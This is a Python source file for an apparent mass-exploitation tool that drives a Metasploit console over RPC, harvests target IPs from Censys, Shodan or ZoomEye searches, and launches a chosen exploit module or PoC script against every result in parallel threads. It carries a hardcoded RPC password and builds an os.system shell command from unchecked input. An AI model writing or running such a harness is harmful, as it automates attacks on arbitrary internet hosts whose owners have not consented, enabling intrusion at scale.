import msfrpc
from censys import Censys
from Queue import Queue
from time import sleep
import re
import optparse
import os
import sys
import threading

class MyMsf(object):
    def __init__(self):
        self.client = msfrpc.Msfrpc({})
        self.console_id = None
        self.query = None
        self.search = None
        self.page = 10
        self.lock = threading.Lock()
        self.thread_count = 10
        self.STOP_ME = [False]
        self.queue = Queue()
    
    def login(self):
        """Login the msf client"""
        self.client.login('msf', 'abc123')

    def get_console(self):
        """Get a console"""
        console = self.client.call('console.create')
        self.console_id = console['id']
        welcome = self.client.call('console.read', [self.console_id])
        return welcome

    def send_command(self, command, search, thread_num, file_name):
        """Execute a command"""
        if search == "censys":
            self.search = Censys()
        elif search == "zoomeye":
            self.search = Zoomeye()
        elif search == "shodan":
            self.search = Shodan()
        else:
            print "you got a wrong type of search engine, you can select censys, shodan or zoomeye as your scan engine."
            sys.exit()
        
        if self.setQuery(command):
            return {'prompt': '', 'busy': False, 'data': 'QUERY => %s\n' % self.query}
        elif self.setPage(command):
            return {'prompt': '', 'busy': False, 'data': 'PAGE => %d\n' % self.page}
        else:
            if command == "exploit\n" or command == "run\n":
                result_file = open("result.txt", "w")
                self.thread_count = thread_num
                if not self.search:
                    print "please select a search engine using the -s or --search option."
                    sys.exit()
                elif self.query:
                    self.search.getConfig()
                    threads = []
                    t1 = threading.Thread(target = self.search.searchIP, args = (self.query, self.page, self.queue, self.STOP_ME))
                    threads.append(t1)
                    t2 = threading.Thread(target=self.exploit, args=(file_name, command, result_file, thread_num))
                    threads.append(t2)
                    for t in threads:
                        t.setDaemon(True)
                        t.start()

                    for t in threads:
                        t.join()

                    result = {'prompt': '', 'busy': False, 'data': '\n'}
                else:
                    return {'prompt': '', 'busy': False, 'data': 'QUERY must be setted'}
            else:
                self.client.call('console.write', [self.console_id, command])
                sleep(0.5)
                result = self.client.call('console.read', [self.console_id])
                while result['busy']:
                    if result['data']:
                        print result['data']
                    sleep(0.5)
                    result = self.client.call('console.read', [self.console_id])
                
                if command == "show options\n":
                    if file_name:
                        result['data'] = "%s   FILE              %s\n" % (result['data'], file_name)
                    result['data'] = "%s   QUERY             %s\n" % (result['data'], self.query)
                    result['data'] = "%s   PAGE              %s\n" % (result['data'], self.page)
            
            return result
    
    def setQuery(self, command):
        r_query = r"set query ([\w\.:]+)\n"
        query = re.search(r_query, command, re.I)
        if query:
            self.query = query.groups()[0]
            return True
        else:
            return False
    
    def setPage(self, command):
        r_page = r"set page (\d+)\n"
        page = re.search(r_page, command, re.I)
        if page:
            self.page = int(page.groups()[0])
            return True
        else:
            return False

    def exploit(self, file_name, command, result_file, thread_num):
        exploitThreads = []
        for i in range(thread_num):
            t = threading.Thread(target = self.DoExploit, args = (file_name, command, result_file))
            exploitThreads.append(t)
        
        for t in exploitThreads:
            t.setDaemon(True)
            t.start()

        for t in exploitThreads:
            t.join()

        while self.thread_count > 1:
            try:
                sleep(1.0)
            except KeyboardInterrupt,e:
                print '[WARNING] User aborted, wait all slave threads to exit...'
                self.STOP_ME[0] = True

    def DoExploit(self, file_name, command, result_file):
        while not self.STOP_ME[0]:
            while not self.queue.empty():
                self.lock.acquire()
                ip = self.queue.get()
                self.lock.release()
                result_str = ""
                if file_name:
                    os.system("python %s %s" % (file_name, ip))
                else:
                    self.lock.acquire()
                    self.client.call('console.write', [self.console_id, 'set RHOSTS %s\n' % ip])
                    sleep(0.5)
                    self.client.call('console.read', [self.console_id])
                    self.client.call('console.write', [self.console_id, 'set RHOST %s\n' % ip])
                    sleep(0.5)
                    self.client.call('console.read', [self.console_id])
                    self.client.call('console.write', [self.console_id, command])
                    sleep(1)
                    result = self.client.call('console.read', [self.console_id])
                    timeout = 0
                    print result
                    while result['busy']:
                        if result['data']:
                            print result['data']
                            result_str = result_str + result['data']
                        sleep(2)
                        result = self.client.call('console.read', [self.console_id])
                        timeout = timeout + 2
                        if timeout == 50:
                            break

                    if result['data']:
                        print result['data']
                        result_str = result_str + result['data']
                    self.lock.release()
                
                if result_str:
                    self.lock.acquire()
                    result_file.write("%s\n" % result_str)
                    self.lock.release()
        
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

class Operate(object):
    def __init__(self):
        self.msf = MyMsf()

    def normal(self, search, thread_num, file_name = None):
        self.msf.login()
        prompt = self.msf.get_console()['prompt']
        while True:
            command = raw_input(prompt)
            if command == "exit":
                break
            result = self.msf.send_command("%s\n" % command, search, thread_num, file_name)
            if result['prompt']:
                prompt = result['prompt'].replace('\x01\x02', '')
            if result['data']:
                print result['data']

def main():
    usage = "usage: %prog [options] "
    parse = optparse.OptionParser(usage = usage)
    parse.add_option("-n", "--normal", action = "store_true", dest = "normal", help = "normal mode")
    parse.add_option("-s", "--search", dest = "search", action = "store", help = "chose a search engine, for example: censys, zoomeye or shodan")
    parse.add_option("-f", "--file", dest = "file_name", action = "store", help = "the poc file you want to run")
    parse.add_option("-t", "--threads", dest = "thread_num", action = "store", help = "set the thread num")
    (options, args) = parse.parse_args()
    if not options.file_name:
        options.normal = True
    if not options.search:
        options.search = "censys"
    if not options.thread_num:
        options.thread_num = 10
    
    op = Operate()
    if options.normal:
        op.normal(options.search, options.thread_num)
    elif options.file_name:
        op.normal(options.search, options.thread_num, options.file_name)

if __name__ == '__main__':
    print """
    ==============================
    |--\ \  / |\  /|  /----  |----
    |--/  \/  | \/ |  |---\  |----
    |     ||  |    |  ____|  |
    ==============================
                   made by s0m30ne
    ------------------------------
    """
    main()
